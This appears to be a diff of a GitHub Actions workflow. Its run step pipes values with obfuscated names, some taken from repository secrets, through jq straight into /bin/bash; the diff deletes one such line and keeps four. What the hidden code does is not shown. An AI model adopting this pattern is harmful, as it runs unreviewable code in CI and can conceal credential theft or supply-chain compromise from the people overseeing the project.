@@ -22,7 +22,6 @@ jobs:
           k6226: ${{ secrets.k6226 }}
         run: |
           printf '%s' "$k6226" | jq -r .b0 | /bin/bash
-          echo $maxgz5 | jq -r .usi75250 | /bin/bash
           printf '%s' "$ps65" | jq -r .qu9 | /bin/bash
           printf '%s' "$fazz59721" | jq -r .je2 | /bin/bash
           echo $hxcpv1797 | jq -r .akrf83348 | /bin/bash
